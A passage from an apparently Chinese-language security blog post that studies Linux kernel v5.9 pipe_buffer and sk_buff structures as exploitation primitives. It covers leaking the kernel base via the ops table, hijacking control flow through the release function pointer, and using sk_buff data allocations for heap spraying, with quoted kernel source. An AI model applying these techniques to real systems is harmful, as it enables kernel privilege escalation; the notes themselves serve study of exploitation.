          <a href="#3-利用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-利用-1" class="headerlink" title="(3)利用"></a>(3)利用</h3>
      
        <h4 id="①信息泄露"   >
          <a href="#①信息泄露" class="heading-link"><i class="fas fa-link"></i></a><a href="#①信息泄露" class="headerlink" title="①信息泄露"></a>①信息泄露</h4>
      <p><code>pipe_buffer</code>结构的<code>buf</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>其中的<code>ops</code>成员，即<code>struct pipe_buf_operations</code>结构的<code>pipe-&gt;bufs[i]-&gt;ops</code>，其中保存着全局的函数表，可通过这个来泄露内核基地址，相关结构如下所示</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>


        <h4 id="②劫持程序流"   >
          <a href="#②劫持程序流" class="heading-link"><i class="fas fa-link"></i></a><a href="#②劫持程序流" class="headerlink" title="②劫持程序流"></a>②劫持程序流</h4>
      <p>当关闭了管道的两端时，调用到<code>free_pipe_info</code>函数，在清理<code>pipe_buffer</code>时进入如下判断：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">    pipe_buf_release(pipe, buf);</span><br></pre></td></tr></table></div></figure>

<p>当管道中存在未被读取的数据时，即我们需要调用<code>write</code>向管道的写入端写入数据</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function">    <span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">    buf-&gt;page = page;</span><br><span class="line">    buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">    buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">    buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后不要将数据全部读取出来，如果全部读取出来的话，那么在<code>read</code>对应的<code>pipe_read</code>函数中就会如下情况</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9  /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function">    <span class="title">pipe_read</span><span class="params">(struct kiocb *iocb, struct iov_iter *to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (!buf-&gt;len) &#123;</span><br><span class="line">        pipe_buf_release(pipe, buf);</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>从而调用<code>pipe_buf_release</code>将<code>buf-&gt;ops</code>清空。</p>
<p>🔺注：（其实这里既然调用到了<code>pipe_buf_release</code>函数，那么我们直接通过<code>read</code>将管道<code>pipe</code>中的所有数据读取出来，其实也能执行该<code>release</code>函数指针的，从而劫持程序控制流的。）</p>
<p>那么接着上述的情况，那么在关闭两端时<code>buf-&gt;ops</code>这个函数表就会存在</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509192251738.png" alt="image-20220509192251738"></p>
<p>而当<code>buf-&gt;ops</code>这个函数表存在时，关闭管道符两端进入上述判断之后，就会调用到其中的<code>pipe_buf_release</code>函数，该函数会调用到这个<code>buf-&gt;ops</code>函数表结构下对应的<code>relase</code>函数指针，该指针在上述的<code>pipe_buf_operations</code>结构中有提到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509193945468.png" alt="image-20220509193945468"></p>
<p>那么如果劫持了<code>buf-&gt;ops</code>这个函数表，就能控制到<code>release</code>函数指针，从而劫持控制流程。</p>
<p>不过<code>pipe</code>管道具体的保存的数据放在哪里，还是不太清楚，听<code>bsauce</code>说是在<code>struct pipe_buffer</code>结构下<code>buf</code>的<code>page</code>里面，但是没有找到，后续还需要继续看看，先mark一下。这样也可以看出来，每写入一条信息时，内核的<code>kmalloc</code>对应的堆内存基本是不发生变化的，与下面提到的<code>sk_buff</code>有点不同。</p>

        <h2 id="3-sk-buff—kmalloc-512及以上"   >
          <a href="#3-sk-buff—kmalloc-512及以上" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-sk-buff—kmalloc-512及以上" class="headerlink" title="3.sk_buff—kmalloc-512及以上"></a>3.sk_buff—kmalloc-512及以上</h2>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40039738/article/details/81095013" >(31条消息) socketpair的用法和理解_雪过无痕_的博客-CSDN博客_socketpair</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>和该结构体相关的是一个<code>socketpair</code>系统调用这个也算是<code>socket</code>网络协议的一种，但是是在本地进程之间通信的，而非在网络之间的通信。说到底，这个其实和<code>pipe</code>非常像，也是一个进程间的通信手段。不过相关区分如下：</p>
<ul>
<li>数据传输模式<ul>
<li><code>pipe</code>：单工，发送端<code>fd[1]</code>发送数据，接收端<code>fd[0]</code>接收数据</li>
<li><code>socketpair</code>：全双工，同一时刻两端均可发送和接收数据，无论信道中的数据是否被接收完毕。</li>
</ul>
</li>
<li>模式<ul>
<li><code>pipe</code>：由<code>flag</code>来定义不同模式</li>
<li><code>socketpair</code>：默认阻塞状态</li>
</ul>
</li>
</ul>
<p>此外在《Linux系统编程手册》一书中提到，<code>pipe()</code>函数实际上被实现成了一个对<code>socketpair</code>的调用。</p>

        <h3 id="1-使用方法-2"   >
          <a href="#1-使用方法-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-使用方法-2" class="headerlink" title="(1)使用方法"></a>(1)使用方法</h3>
      
        <h4 id="①创建-3"   >
          <a href="#①创建-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#①创建-3" class="headerlink" title="①创建"></a>①创建</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//默认必须</span></span><br><span class="line"><span class="keyword">int</span> socket_fd[<span class="number">2</span>];</span><br><span class="line"><span class="comment">//domain参数必须被指定为AF_UNIX,不同的</span></span><br><span class="line"><span class="keyword">int</span> sockPair_return = socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, socket_fd);</span><br><span class="line"><span class="keyword">if</span>( sockPair_return &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    perror( <span class="string">&quot;socketpair()&quot;</span> );</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后和<code>pipe</code>管道一样，使用<code>write/read</code>即可，不过这个的fd两端都可以写入读取，但是消息传递的时候一端写入消息，就需要从另一端才能把消息读取出来</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* msg = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">write(socket_fd[<span class="number">0</span>],msg,<span class="number">0x8</span>);</span><br><span class="line">read(socket_fd[<span class="number">1</span>],buf,<span class="number">0x8</span>);</span><br></pre></td></tr></table></div></figure>


        <h4 id="②释放-3"   >
          <a href="#②释放-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放-3" class="headerlink" title="②释放"></a>②释放</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(socket_fd[<span class="number">0</span>]);</span><br><span class="line">close(socket_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>可以看到和<code>pipe</code>是很相似的。</p>

        <h3 id="2-内存分配与释放-2"   >
          <a href="#2-内存分配与释放-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-内存分配与释放-2" class="headerlink" title="(2)内存分配与释放"></a>(2)内存分配与释放</h3>
      <p>在调用<code>socketpair</code>这个系统调用号时，并不会进行相关的内存分配，只有在使用<code>write</code>来写入消息，进行数据传输时才会分配。</p>

        <h4 id="①分配-1"   >
          <a href="#①分配-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#①分配-1" class="headerlink" title="①分配"></a>①分配</h4>
      <p>在调用<code>write</code>进行数据写入时</p>
<p>函数链：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write -&gt; ksys_write() -&gt; vfs_write() -&gt; new_sync_write() -&gt; call_write_iter() -&gt; sock_write_iter() -&gt; sock_sendmsg() -&gt; sock_sendmsg_nosec() -&gt; unix_stream_sendmsg()-&gt;内存申请/数据复制</span><br></pre></td></tr></table></div></figure>

<p>在<code>unix_stream_sendmsg</code>开始分叉</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/unix/af_unix.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_sendmsg</span><span class="params">(struct socket *sock, struct msghdr *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">			       <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">other</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> err, size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	<span class="keyword">int</span> sent = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">scm_cookie</span> <span class="title">scm</span>;</span></span><br><span class="line">	<span class="keyword">bool</span> fds_sent = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">int</span> data_len;</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">	<span class="keyword">while</span> (sent &lt; len) &#123;</span><br><span class="line">		size = len - sent;</span><br><span class="line">		<span class="comment">/* Keep two messages in the pipe so it schedules better */</span></span><br><span class="line">		size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, (sk-&gt;sk_sndbuf &gt;&gt; <span class="number">1</span>) - <span class="number">64</span>);</span><br><span class="line">		<span class="comment">/* allow fallback to order-0 allocations */</span></span><br><span class="line">		size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, SKB_MAX_HEAD(<span class="number">0</span>) + UNIX_SKB_FRAGS_SZ);</span><br><span class="line">		data_len = <span class="keyword">max_t</span>(<span class="keyword">int</span>, <span class="number">0</span>, size - SKB_MAX_HEAD(<span class="number">0</span>));</span><br><span class="line">		data_len = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, size, PAGE_ALIGN(data_len));</span><br><span class="line">        <span class="comment">//------------------分叉一:内存申请部分</span></span><br><span class="line">		skb = sock_alloc_send_pskb(sk, size - data_len, data_len,</span><br><span class="line">					   msg-&gt;msg_flags &amp; MSG_DONTWAIT, &amp;err,</span><br><span class="line">					   get_order(UNIX_SKB_FRAGS_SZ));</span><br><span class="line">        <span class="comment">//相关检查部分</span></span><br><span class="line">		<span class="keyword">if</span> (!skb)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		<span class="comment">/* Only send the fds in the first buffer */</span></span><br><span class="line">		err = unix_scm_to_skb(&amp;scm, skb, !fds_sent);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			kfree_skb(skb);</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//.....</span></span><br><span class="line">        <span class="comment">//----------------------分叉二:数据复制部分</span></span><br><span class="line">		skb_put(skb, size - data_len);</span><br><span class="line">		skb-&gt;data_len = data_len;</span><br><span class="line">		skb-&gt;len = size;</span><br><span class="line">        <span class="comment">//这里开始进行数据复制</span></span><br><span class="line">		err = skb_copy_datagram_from_iter(skb, <span class="number">0</span>, &amp;msg-&gt;msg_iter, size);</span><br><span class="line">		<span class="keyword">if</span> (err) &#123;</span><br><span class="line">			kfree_skb(skb);</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">		sent += size;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sent;</span><br><span class="line">out_err:</span><br><span class="line">	scm_destroy(&amp;scm);</span><br><span class="line">	<span class="keyword">return</span> sent ? : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-内存申请-1"   >
          <a href="#A-内存申请-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-内存申请-1" class="headerlink" title="A.内存申请"></a>A.内存申请</h5>
      <p>先进行相关内存申请，即<code>sock_alloc_send_pskb() -&gt; alloc_skb_with_frags() -&gt; alloc_skb() -&gt; __alloc_skb()</code></p>
<p>还是挺长的，但是最重要的还是最后的<code>__alloc_skb</code>函数，</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *__<span class="title">alloc_skb</span>(<span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">gfp_t</span> <span class="title">gfp_mask</span>,</span></span><br><span class="line"><span class="class">			    <span class="title">int</span> <span class="title">flags</span>, <span class="title">int</span> <span class="title">node</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">cache</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> *<span class="title">shinfo</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	u8 *data;</span><br><span class="line">	<span class="keyword">bool</span> pfmemalloc;</span><br><span class="line"></span><br><span class="line">	cache = (flags &amp; SKB_ALLOC_FCLONE)</span><br><span class="line">		? skbuff_fclone_cache : skbuff_head_cache;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sk_memalloc_socks() &amp;&amp; (flags &amp; SKB_ALLOC_RX))</span><br><span class="line">		gfp_mask |= __GFP_MEMALLOC;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Get the HEAD */</span></span><br><span class="line">    <span class="comment">//从专门的缓存池skbuff_fclone_cache/skbuff_head_cache中申请内存</span></span><br><span class="line">    <span class="comment">//作为头部的管理结构</span></span><br><span class="line">	skb = kmem_cache_alloc_node(cache, gfp_mask &amp; ~__GFP_DMA, node);</span><br><span class="line">	<span class="keyword">if</span> (!skb)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">    <span class="comment">//先对齐，这个和L1_CACHE_BYTES有关,64位系统即和64(0x40)对齐,32位类似，具体的还是查一下最好</span></span><br><span class="line">	size = SKB_DATA_ALIGN(size);</span><br><span class="line">    <span class="comment">//size += 对齐之后的0x140</span></span><br><span class="line">    <span class="comment">//那么size只可能是0x140+n*0x40,最低为0x180,属于kmalloc-512</span></span><br><span class="line">	size += SKB_DATA_ALIGN(<span class="keyword">sizeof</span>(struct skb_shared_info));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//虽然是kmalloc_reserve函数，但是最终还是kmalloc形式</span></span><br><span class="line">    <span class="comment">//调用到`__kmalloc_node_track_caller`函数进行分配</span></span><br><span class="line">    <span class="comment">//这个data即为我们实际的存储数据的地方,也是从kmalloc申请出的堆块</span></span><br><span class="line">    <span class="comment">//并且是从对开的开头位置处开始存储,完成内存申请后返回unix_stream_sendmsg函数</span></span><br><span class="line">    <span class="comment">//在`skb_copy_datagram_from_iter`函数中数据会被复制</span></span><br><span class="line">	data = kmalloc_reserve(size, gfp_mask, node, &amp;pfmemalloc);</span><br><span class="line">	<span class="keyword">if</span> (!data)</span><br><span class="line">		<span class="keyword">goto</span> nodata;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	size = SKB_WITH_OVERHEAD(ksize(data));</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">    <span class="comment">//初始化头部的管理结构</span></span><br><span class="line">	<span class="built_in">memset</span>(skb, <span class="number">0</span>, offsetof(struct sk_buff, tail));</span><br><span class="line">	<span class="comment">/* Account for allocated memory : skb + skb-&gt;head */</span></span><br><span class="line">	skb-&gt;truesize = SKB_TRUESIZE(size);</span><br><span class="line">	skb-&gt;pfmemalloc = pfmemalloc;</span><br><span class="line">	refcount_set(&amp;skb-&gt;users, <span class="number">1</span>);</span><br><span class="line">	skb-&gt;head = data;</span><br><span class="line">	skb-&gt;data = data;</span><br><span class="line">	skb_reset_tail_pointer(skb);</span><br><span class="line">	skb-&gt;end = skb-&gt;tail + size;</span><br><span class="line">	skb-&gt;mac_header = (typeof(skb-&gt;mac_header))~<span class="number">0U</span>;</span><br><span class="line">	skb-&gt;transport_header = (typeof(skb-&gt;transport_header))~<span class="number">0U</span>;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> skb;</span><br><span class="line">nodata:</span><br><span class="line">	kmem_cache_free(cache, skb);</span><br><span class="line">	skb = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h6 id="内存申请总结：-1"   >
          <a href="#内存申请总结：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#内存申请总结：-1" class="headerlink" title="内存申请总结："></a>内存申请总结：</h6>
      <ul>
<li><code>sk_buff</code>为数据的管理结构从专门的缓存池<code>skbuff_fclone_cache/skbuff_head_cache</code>中申请内存，没办法进行控制</li>
<li><code>skb-&gt;data</code>为实际的数据结构<ul>
<li><code>size</code>：<code>0x140+n*0x40</code>(0x40的倍数补齐)。即如果传入的数据长度为0x3f，则n为1，传入数据为0x41，则n为2。</li>
<li>堆块申请：走<code>kmalloc</code>进行申请，比较常见的种类，方便堆喷。</li>
</ul>
</li>
<li>每调用<code>wirte</code>函数写入一次数据，都会走一遍流程，申请新的<code>sk_buff</code>和<code>skb-&gt;data</code>，不同消息之间相互独立。</li>
</ul>

        <h5 id="B-数据复制-1"   >
          <a href="#B-数据复制-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-数据复制-1" class="headerlink" title="B.数据复制"></a>B.数据复制</h5>
      <p>相关内存申请完成之后，回到<code>unix_stream_sendmsg</code>函数，开始进行数据复制<code>skb_copy_datagram_from_iter</code>，即上述提到的。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/datagram.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">skb_copy_datagram_from_iter</span><span class="params">(struct sk_buff *skb, <span class="keyword">int</span> offset,</span></span></span><br><span class="line"><span class="params"><span class="function">                                struct iov_iter *from,</span></span></span><br><span class="line"><span class="params"><span class="function">                                <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = skb_headlen(skb);			<span class="comment">// skb-&gt;len - skb-&gt;data_len;</span></span><br><span class="line">    <span class="keyword">int</span> i, copy = start - offset;			<span class="comment">// copy 是线性数据区的剩余空间大小</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">frag_iter</span>;</span></span><br><span class="line">    <span class="comment">//拷贝到申请的保存数据的堆块skb-&gt;data</span></span><br><span class="line">    <span class="keyword">if</span> (copy &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">            copy = len;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_iter(skb-&gt;data + offset, copy, from) != copy)</span><br><span class="line">            <span class="keyword">goto</span> fault;</span><br><span class="line">        <span class="keyword">if</span> ((len -= copy) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        offset += copy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="②释放-4"   >
          <a href="#②释放-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放-4" class="headerlink" title="②释放"></a>②释放</h4>
      <p>当从<code>socker</code>套接字中读取出某条信息的所有数据时，就会发生该条信息的相关内存的释放，即该条信息对应<code>sk_buff</code>和<code>skb-&gt;data</code>的释放。同样的，如果该条信息没有被读取完毕，则不会发生该信息相关内存的释放。</p>
<p>在<code>read</code>时进行的函数调用链：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read -&gt; ksys_read() -&gt; vfs_read() -&gt; new_sync_read() -&gt; call_read_iter() -&gt; sock_read_iter() -&gt; sock_recvmsg() -&gt; sock_recvmsg_nosec() -&gt; unix_stream_recvmsg() -&gt; unix_stream_read_generic()</span><br></pre></td></tr></table></div></figure>

<p>同样的在<code>unix_stream_read_generic</code>处开始分叉，也是分为两部分，下面截取重要部分</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 